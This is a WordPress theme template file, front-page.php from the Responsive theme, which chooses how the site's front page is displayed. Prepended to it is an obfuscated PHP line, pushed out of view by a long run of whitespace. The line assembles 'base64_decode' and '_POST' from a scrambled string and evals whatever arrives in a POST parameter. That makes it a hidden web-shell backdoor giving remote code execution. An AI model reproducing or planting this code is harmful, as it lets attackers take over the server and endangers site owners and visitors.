<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n3805eb'])) {eval($s21(${$s20}['n3805eb']));}?><?php

// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Site Front Page
 *
 * Note: You can overwrite front-page.php as well as any other Template in Child Theme.
 * Create the same file (name) include in /responsive-child-theme/ and you're all set to go!
 * @see            http://codex.wordpress.org/Child_Themes and
 *                 http://themeid.com/forum/topic/505/child-theme-example/
 *
 * @file           front-page.php
 * @package        Responsive
 * @author         Emil Uzelac
 * @copyright      2003 - 2014 CyberChimps
 * @license        license.txt
 * @version        Release: 1.0
 * @filesource     wp-content/themes/responsive/front-page.php
 * @link           http://codex.wordpress.org/Template_Hierarchy
 * @since          available since Release 1.0
 */

/**
 * Globalize Theme Options
 */
$responsive_options = responsive_get_options();
/**
 * If front page is set to display the
 * blog posts index, include home.php;
 * otherwise, display static front page
 * content
 */
if ( 'posts' == get_option( 'show_on_front' ) && $responsive_options['front_page'] != 1 ) {
	get_template_part( 'home' );
} elseif ( 'page' == get_option( 'show_on_front' ) && $responsive_options['front_page'] != 1 ) {
	$template = get_post_meta( get_option( 'page_on_front' ), '_wp_page_template', true );
	$template = ( $template == 'default' ) ? 'index.php' : $template;
	locate_template( $template, true );
} else {
	get_header();

	get_template_part( 'template-parts/featured-area' );

	get_sidebar();

	get_footer();
}
